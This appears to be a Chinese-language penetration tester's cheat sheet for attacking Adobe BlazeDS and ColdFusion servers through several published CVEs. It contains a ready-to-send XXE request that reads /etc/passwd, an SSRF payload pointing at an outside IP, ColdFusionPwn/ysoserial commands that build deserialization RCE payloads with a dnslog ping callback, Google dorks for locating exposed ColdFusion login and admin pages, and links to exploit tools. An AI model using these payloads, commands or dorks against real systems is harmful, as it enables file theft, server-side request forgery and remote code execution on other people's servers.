### [CVE-2009-3960] XXE BlazeDS<= 3.2
影响组件：
HTTPChannel servlet。具体的，是
```
“mx.messaging.channels.HTTPChannel”
“mx.messaging.channels.SecureHTTPChannel”
```
在这个包`flex-messaging-common.jar`里。
HTTPChannel 以AMFX格式的数据进行通信（就是AMF的XML格式）。
这个endpoints在这个文件`Flex/WEB-INF/services-config.xml`里定义。

默认HTTPChannel映射到了以下接口：
- /messagebroker/http
- /messagebroker/httpsecure
不过不同的框架（比如BlazeDS, Adobe LiveCycle Data Services）会被映射到不同的路径。

```http
POST /samples/messagebroker/http HTTP/1.1
Content-type: application/x-amf

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [ <!ENTITY x3 SYSTEM "/etc/passwd"> ]>
<amfx ver="3" xmlns="http://www.macromedia.com/2005/amfx">
  <body>
    <object type="flex.messaging.messages.CommandMessage">
      <traits>
        <string>body</string><string>clientId</string><string>correlationId</string>
        <string>destination</string><string>headers</string><string>messageId</string>
        <string>operation</string><string>timestamp</string><string>timeToLive</string>
      </traits><object><traits />
      </object>
      <null /><string /><string />
      <object>
        <traits>
          <string>DSId</string><string>DSMessagingVersion</string>
        </traits>
        <string>nil</string><int>1</int>
      </object>
      <string>&x3;</string>
<int>5</int><int>0</int><int>0</int>
    </object>
  </body>
</amfx>
```

参考：
- [Adobe (Multiple Products) - XML External Entity / XML Injection](https://www.exploit-db.com/exploits/11529)
- [Adboe官方对BlazeDS的公告](https://www.adobe.com/support/security/bulletins/apsb10-05.html)

### [CVE-2015-3269]XXE BlazeDS< 4.7.1
http://mail-archives.apache.org/mod_mbox/flex-users/201511.mbox/%3Cop.x8j4mv0bn9yd54@christofers-macbook-pro.local%3E
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

### [CVE-2015-5255]SSRF BlazeDS< 4.7.2
http://apache-flex-users.2333346.n4.nabble.com/CVE-2015-3269-Apache-Flex-BlazeDS-Insecure-Xml-Entity-Expansion-Vulnerability-td10976.html

```xml
<!DOCTYPE foo PUBLIC "-//VSR//PENTEST//EN"
"http://49.x.y.z:8888/protected-service"><foo>Some content</foo>
```


### [CVE-2017-3066]Adobe Coldfusion BlazeDS反序列化
影响范围：
- Adobe ColdFusion 2016 Update 3 and earlier
- Adobe ColdFusion 11 update 11 and earlier
- ColdFusion 10 Update 22 and earlier

利用方式两种：
- 实现Externalizable接口(`org.apache.axis2.util.MetaDataEntry`)
- 任意Setter方法(`org.jgroups.blocks.ReplicatedTree`)

分别对应这个工具的两个参数`-e/-s`。
```bash
$ java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.8-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 "ping 111.oqp5zz.dnslog.cn"  poc.amf
$ java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.8-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -s CommonsBeanutils1 "ping 222.oqp5zz.dnslog.cn"  poc2.amf
```

### [CVE-2017-5641] 反序列化 BlazeDS< 4.7.3
- [[CVE-2017-5641] - DrayTek Vigor ACS 2 Java Deserialisation RCE](https://seclists.org/fulldisclosure/2018/Apr/40)



## 参考
- [Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution](https://www.exploit-db.com/exploits/43993)
- https://codewhitesec.blogspot.com/2018/03/exploiting-adobe-coldfusion.html
- [Exploitation Tool for CVE-2017-3066 targeting Adobe Coldfusion 11/12](https://github.com/codewhitesec/ColdFusionPwn/tree/master/src/main/java)
- https://github.com/vulhub/vulhub/blob/master/coldfusion/CVE-2017-3066/README.zh-cn.md
- [Adobe官方公告](https://helpx.adobe.com/security/products/coldfusion/apsb17-14.html)

# 其他参考

- [ColdFusion for Pentesters](http://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf)
- http://web.archive.org/web/20101226181618/http://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf


## Google Dorks
```
- filetype:cfm "cfapplication name" password
- inurl:login.cfm
- intitle:"Error Occurred" "The error occurred in"
- filetype:cfm
- intitle:"ColdFusion Administrator Login“
- intitle:"Index of" cfide
- inurl:/CFIDE/componentutils/
```


## CodeFusion各个版本的界面


# 利用工具
- https://github.com/codewhitesec/ColdFusionPwn/tree/master/src/main/java
- https://github.com/mbechler/marshalsec/blob/6e5f2a7974a62fcd0e5bbbf8df64774a50db2eb8/src/main/java/marshalsec/BlazeDSAMF3AM.java
- https://github.com/mbechler/marshalsec/blob/0471b932a09c8aca21876de80c8abf65b251c9ca/src/main/java/marshalsec/BlazeDSAMFX.java
- https://github.com/vulhub/vulhub/blob/master/coldfusion/CVE-2017-3066/README.zh-cn.md



